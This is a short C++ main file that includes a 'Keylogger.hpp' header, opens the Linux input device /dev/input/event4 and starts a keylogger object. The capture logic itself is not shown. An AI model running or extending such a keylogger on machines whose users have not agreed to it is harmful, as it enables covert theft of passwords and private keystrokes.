#include <iostream>
#include "Keylogger.hpp"

int main(void)
{
  Keylogger keylogger("/dev/input/event4");

  keylogger.start();
  return 0;
}
